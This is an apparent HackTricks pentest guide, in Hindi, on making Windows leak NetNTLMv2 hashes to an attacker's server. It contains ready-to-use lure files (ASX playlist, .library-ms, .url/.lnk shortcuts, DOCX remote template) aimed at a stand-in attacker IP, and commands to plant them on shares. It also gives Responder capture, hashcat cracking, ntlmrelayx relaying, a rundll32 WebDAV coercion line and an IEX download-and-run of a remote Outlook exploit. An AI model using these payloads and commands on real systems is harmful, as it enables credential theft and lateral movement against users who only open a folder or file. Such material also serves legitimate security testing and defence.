# NTLM creds चुराने की जगहें

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) से सभी बेहतरीन ideas देखें—online Microsoft Word file download करने से लेकर NTLM leaks source https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) तक।**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

यदि आप **ऐसे share पर write कर सकते हैं जिसे users या scheduled jobs Explorer में browse करते हैं**, तो ऐसी files डालें जिनका metadata आपके UNC (जैसे `\\ATTACKER\share`) की ओर point करता हो। Folder को render करने पर **implicit SMB authentication** trigger होता है और आपके listener को **NetNTLMv2** leak हो जाता है।<sup>[[1]](#references)</sup>

1. **Lures generate करें** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF आदि शामिल हैं)।
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **उन्हें writable share पर रखें** (कोई भी folder जिसे victim खोलता है):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen और crack करें**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows एक साथ कई files को hit कर सकता है; Explorer जिन चीज़ों का preview (`BROWSE TO FOLDER`) दिखाता है, उनके लिए किसी click की आवश्यकता नहीं होती।

### Windows Media Player playlists (.ASX/.WAX)

यदि आप किसी target से अपने नियंत्रण वाली Windows Media Player playlist को open या preview करवा सकते हैं, तो entry को UNC path पर point करके Net‑NTLMv2 leak कर सकते हैं। WMP referenced media को SMB के माध्यम से fetch करने का प्रयास करेगा और स्वतः authenticate करेगा।<sup>[[3]](#references)[[4]](#references)</sup>

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Collection और cracking flow:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer .library-ms files को ZIP archive के भीतर से सीधे खोले जाने पर असुरक्षित तरीके से संभालता है। यदि library definition किसी remote UNC path (जैसे, \\attacker\share) की ओर संकेत करती है, तो ZIP के भीतर .library-ms को केवल browse/launch करने से Explorer UNC को enumerate करता है और attacker को NTLM authentication भेजता है। इससे एक NetNTLMv2 प्राप्त होता है, जिसे offline crack किया जा सकता है या संभावित रूप से relay किया जा सकता है।<sup>[[2]](#references)</sup>

attacker UNC की ओर संकेत करने वाला न्यूनतम .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- ऊपर दिए गए XML के साथ `.library-ms` file बनाएं (अपना IP/hostname सेट करें)।
- इसे ZIP करें (Windows पर: Send to → Compressed (zipped) folder) और ZIP को target तक पहुंचाएं।
- NTLM capture listener चलाएं और victim के ZIP के अंदर से `.library-ms` खोलने की प्रतीक्षा करें।


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net-NTLMv2 leak

Microsoft Outlook for Windows calendar items में extended MAPI property `PidLidReminderFileParameter` को process करता था। यदि वह property किसी UNC path (जैसे, `\\attacker\share\alert.wav`) की ओर point करती थी, तो reminder के बजने पर Outlook SMB share से contact करता था और बिना किसी click के user का Net-NTLMv2 leak हो जाता था। इसे March 14, 2023 को patch किया गया था, लेकिन legacy/untouched fleets और historical incident response के लिए यह अभी भी अत्यंत relevant है।<sup>[[5]](#references)</sup>

PowerShell (Outlook COM) के साथ Quick exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener side:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
नोट्स
- Victim के सिस्टम पर reminder trigger होने के समय केवल Outlook for Windows का running होना आवश्यक है।
- leak से Net‑NTLMv2 प्राप्त होता है, जिसका उपयोग offline cracking या relay के लिए किया जा सकता है (pass-the-hash नहीं)।

### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer shortcut icons को automatically render करता है। हालिया research से पता चला कि UNC‑icon shortcuts के लिए Microsoft के April 2025 patch के बाद भी, shortcut target को UNC path पर host करके और icon को local रखकर, बिना किसी click के NTLM authentication trigger करना संभव था (इस patch bypass को CVE‑2025‑50154 assigned किया गया)। केवल folder को view करने पर Explorer remote target से metadata retrieve करता है और attacker के SMB server को NTLM भेजता है।<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell के माध्यम से Program Shortcut payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Shortcut को ZIP में रखें और victim से उसे browse करवाएँ।
- Shortcut को ऐसे writable share पर रखें जिसे victim खोलेगा।
- उसी folder में अन्य lure files के साथ combine करें, ताकि Explorer items का preview दिखाए।

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows केवल execution के दौरान ही नहीं, बल्कि **view/preview** (icon rendering) के दौरान भी `.lnk` metadata load करता है। CVE‑2026‑25185 एक parsing path दिखाता है जहाँ **ExtraData** blocks shell को icon path resolve करने और **load के दौरान** filesystem को access करने का कारण बनाते हैं। यदि path remote हो, तो इससे outbound NTLM emit होता है।

Key trigger conditions (`CShellLink::_LoadFromStream` में observed):
- ExtraData में **DARWIN_PROPS** (`0xa0000006`) शामिल करें (icon update routine का gate)।
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) को **TargetUnicode** populated के साथ शामिल करें।
- Loader `TargetUnicode` में environment variables expand करता है और resulting path पर `PathFileExistsW` call करता है।

यदि `TargetUnicode` किसी UNC path (जैसे, `\\attacker\share\icon.ico`) पर resolve होता है, तो shortcut वाले folder को **सिर्फ view करने** से outbound authentication हो जाती है। यही load path **indexing** और **AV scanning** से भी trigger हो सकता है, जिससे यह एक practical no-click leak surface बन जाता है।<sup>[[7]](#references)</sup>

Windows GUI का उपयोग किए बिना इन structures को build/inspect करने के लिए **LnkMeMaybe** project में research tooling (parser/generator/UI) उपलब्ध है।<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Native **WebDAV client** का abuse करके current logon session को किसी arbitrary **HTTP/WebDAV** endpoint पर authenticate करने के लिए force किया जा सकता है:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
यह क्यों उपयोगी है:
- **attacker-controlled WebDAV server** के विरुद्ध, यह कोई custom client छोड़े बिना **NTLM over HTTP** trigger कर सकता है।
- **internal hosts** के विरुद्ध, यह lateral movement से पहले **stolen credentials कहाँ स्वीकार की जाती हैं**, इसे **validate** करने का एक शांत तरीका है।<sup>[[9]](#references)</sup>
- जब **SMB egress filtered** हो, लेकिन **HTTP/WebDAV** अभी भी reachable हो, तब यह command एक अच्छा alternative है।

Operational notes:
- Source host पर **WebClient** service चल रही होनी चाहिए।
- `rundll32.exe`, `davclnt.dll` को load करता है और Windows से **current user's credentials** का उपयोग करके WebDAV authentication handle करवाता है।<sup>[[10]](#references)</sup>
- यदि आप इसे अपने control वाले infrastructure की ओर point करते हैं, तो ऐसे NTLM-aware HTTP listener/relay का उपयोग करें:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Detection perspective से, कई internal systems के विरुद्ध बार-बार `rundll32.exe davclnt.dll,DavSetCookie` executions, normal user behaviour की तुलना में **credential validation / spray-like lateral movement prep** का strong signal हैं।<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents किसी external template को reference कर सकते हैं। यदि आप attached template को UNC path पर set करते हैं, तो document खोलने पर SMB से authenticate किया जाएगा।

Minimal DOCX relationship changes (word/ के अंदर):

1) word/settings.xml को edit करें और attached template reference जोड़ें:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels को edit करें और rId1337 को अपने UNC पर point करें:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx में Repack करें और deliver करें। अपना SMB capture listener चलाएँ और open होने की प्रतीक्षा करें।

NTLM को relay करने या abuse करने से जुड़े post-capture ideas के लिए देखें:

{{#ref}}
README.md
{{#endref}}


## संदर्भ
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
